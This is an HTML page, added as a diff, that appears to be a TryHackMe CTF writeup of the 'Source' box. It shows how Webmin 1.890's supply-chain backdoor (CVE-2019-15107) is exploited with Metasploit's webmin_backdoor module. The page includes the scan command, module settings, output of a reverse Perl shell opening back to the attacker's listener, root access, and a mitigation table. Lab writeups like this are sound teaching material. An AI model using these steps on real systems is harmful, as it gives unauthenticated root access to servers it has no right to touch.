@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Source — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Nmap fingerprinned Webmin 1.890 on port 10000. That version contains a supply-chain backdoor (CVE-2019-15107) introduced into the official download.…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/source.html">
+<meta property="og:title" content="Source — TryHackMe writeup">
+<meta property="og:description" content="Nmap fingerprinned Webmin 1.890 on port 10000. That version contains a supply-chain backdoor (CVE-2019-15107) introduced into the official download.…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/source.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Source — TryHackMe writeup","description":"Nmap fingerprinned Webmin 1.890 on port 10000. That version contains a supply-chain backdoor (CVE-2019-15107) introduced into the official download.…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-11","url":"https://thecyberfarhan.github.io/writeups/source.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/source.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Source</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 11, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Nmap fingerprinned Webmin 1.890 on port 10000. That version contains a supply-chain backdoor (CVE-2019-15107) introduced into the official download. Metasploit's <code>webmin_backdoor</code> module landed a root shell in one run — no credentials, no pivoting, no escalation needed. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🐉 Metasploit (<code>exploit/linux/http/webmin_backdoor</code>)</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Source</strong> — a box whose flags spell out the lesson before you've even read them: <code>THM{SUPPLY_CHAIN_COMPROMISE}</code> and <code>THM{UPDATE_YOUR_INSTALL}</code>. Running Webmin 1.890, a version that had a backdoor secretly planted in its official tarball by an unknown attacker. Not a misconfig, not a weak password — someone tampered with the software at the source. The exploit requires no credentials and delivers root on first attempt. Sometimes the most dangerous vulnerability isn't in how you deployed the software. It's in what you deployed.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What a web administration panel like Webmin is</li><li>What a supply-chain attack is and why it's particularly dangerous</li><li>Basic Metasploit module configuration</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.182.62 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr><tr><td>10000/tcp</td><td>HTTP</td><td><strong>MiniServ 1.890 (Webmin httpd)</strong></td></tr></tbody></table>
+<p>No port 80 — Feroxbuster and WhatWeb both confirmed connection refused. The entire attack surface is Webmin on port 10000, running over HTTPS. Nmap identifies the version as <code>MiniServ/1.890</code> directly from the server header — no guessing required.</p>
+<p><strong>Webmin 1.890</strong> is the exact version known to contain CVE-2019-15107, a backdoor introduced into the official download package. The version string in the scan output is the entire vulnerability assessment.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~5 mins into the box)</p>
+<h3>CVE-2019-15107 — Webmin Supply-Chain Backdoor</h3>
+<p><strong>What happened?</strong> In 2019, an unknown attacker compromised the build infrastructure used to produce Webmin's official download packages. A backdoor was secretly inserted into the <code>password_change.cgi</code> script: when a specific parameter is present in a request, it allows unauthenticated remote code execution as whatever user Webmin is running as — typically root. The backdoor affected versions 1.882 through 1.921 and was present in official packages hosted on SourceForge and the Webmin website for over a year before discovery.</p>
+<p>This is a supply-chain attack: the software itself was weaponised at the source, meaning every admin who downloaded the official package from the official site received a compromised installation. Patching the server means nothing if the installer is already compromised.</p>
+<p class="aside">Loading the Metasploit module:</p>
+<pre><code>msfconsole
+msf &gt; use exploit/linux/http/webmin_backdoor</code></pre>
+<p class="aside">Configuring the module — <code>SSL true</code> is critical since Webmin serves HTTPS on 10000, not plain HTTP:</p>
+<pre><code>msf exploit(linux/http/webmin_backdoor) &gt; set RHOST 10.48.182.62
+msf exploit(linux/http/webmin_backdoor) &gt; set RPORT 10000
+msf exploit(linux/http/webmin_backdoor) &gt; set SSL true
+msf exploit(linux/http/webmin_backdoor) &gt; set LHOST 192.168.134.217
+msf exploit(linux/http/webmin_backdoor) &gt; set ForceExploit true
+msf exploit(linux/http/webmin_backdoor) &gt; run</code></pre>
+
+<pre><code># output
+[*] Started reverse TCP handler on 192.168.134.217:4444
+[+] The target is vulnerable. Exploitable: version 1.890 is vulnerable   # ^^^ confirmed
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 1 opened (192.168.134.217:4444 -&gt; 10.48.182.62:50938)</code></pre>
+<p>Shell landed. No credentials. No authentication bypass. The backdoor just opens the door.</p>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">Checking who we landed as:</p>
+<pre><code>id</code></pre>
+
+<pre><code>uid=0(root) gid=0(root) groups=0(root)</code></pre>
+<p>Straight to root — Webmin runs as root by design, so the backdoor inherits that. Metasploit's <code>shell</code> command upgraded the raw command execution to an interactive shell via Python.</p>
+<p class="aside">Collecting both flags in one shot:</p>
+<pre><code>cat /root/root.txt
+cat /home/dark/user.txt</code></pre>
+
+<pre><code>THM{UPDATE_YOUR_INSTALL}
+THM{SUPPLY_CHAIN_COMPROMISE}</code></pre>
+<p>The flags name the vulnerability class and the mitigation. The box is essentially a self-contained lesson statement.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Webmin 1.890 supply-chain backdoor (CVE-2019-15107)</td><td class="sev-critical">Critical</td><td>Update to Webmin 1.930+; verify package integrity via checksum before installation; subscribe to vendor security advisories</td></tr><tr><td>Webmin exposed directly to the internet on port 10000</td><td class="sev-high">High</td><td>Restrict Webmin to localhost or an internal network only; use a VPN or SSH tunnel for remote administration access</td></tr><tr><td>Webmin running as root</td><td class="sev-medium">Medium</td><td>Run Webmin as a dedicated low-privilege service account where possible; principle of least privilege applies to admin panels too</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Supply-chain attacks are particularly insidious because they subvert trust at the source — downloading software from the official website is no longer sufficient if the build pipeline itself has been compromised. Verifying checksums, monitoring for unexpected version behaviour, and subscribing to vendor security advisories are non-negotiable hygiene for any software running with elevated privileges.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Skip <code>ForceExploit true</code> — Metasploit's built-in version check correctly identified 1.890 as vulnerable, so forcing was unnecessary. Also set <code>SSL true</code> before any other options so there's no risk of running the exploit against the wrong protocol and getting a confusing failure.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/source_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
